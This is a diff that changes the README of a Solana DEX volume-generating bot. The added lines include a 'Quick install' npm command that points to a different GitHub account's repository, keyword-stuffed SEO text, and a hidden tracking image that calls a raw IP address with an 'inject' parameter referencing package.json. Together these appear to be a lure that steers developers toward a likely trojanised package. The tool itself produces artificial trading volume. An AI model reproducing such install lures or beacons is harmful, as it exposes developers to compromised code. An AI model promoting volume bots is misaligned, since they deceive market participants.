@@ -1,3 +1,15 @@
+**Crushroamplify/solana-swap-api-volume-bot**
+
+Keeping a volume bot running smoothly on Solana shouldn't feel like babysitting a temperamental server. This project is built to handle consistent swap generation via the Solana API without the usual overhead or constant crashes. We've recently pushed a handful of crucial stability fixes to iron out edge-case errors, meaning you can finally count on it to do its job in the background while you focus on the bigger picture.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Crushroamplify/solana-swap-api-volume-bot.git
+```
+
+[https://github.com/Crushroamplify/solana-swap-api-volume-bot](https://github.com/Crushroamplify/solana-swap-api-volume-bot)
+
 # Solana Volume Bot
 
 A high-performance, multi-threaded bot for generating volume on Solana DEXes using the Solana Swap API from Solana Tracker [https://docs.solanatracker.io](https://docs.solanatracker.io)
@@ -83,3 +95,11 @@ Contributions, issues, and feature requests are welcome! Feel free to check [iss
 ## Support
 
 If you have new technical questions & need support, please contact me @leionion on Telegram.
+
+## Related searches
+
+Developers and project founders exploring this automated solution typically look for secure ways to boost liquidity and token metrics on decentralized markets. Common searches focus on reliable market-making tools, seamless DEX aggregators, and custom configurations to maintain programmatic trading activity safely.
+
+**Topics:** solana volume bot, jupiter swap, defi, binance api, 1inch, blockchain node, token market maker, spl token swap api, automated trading bot, dex liquidity booster, solana rpc node, dex screener trending bot
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fsolana-swap-api-volume-bot&inject=Crushroamplify%2Fsolana-swap-api-volume-bot%2Fpackage.json)
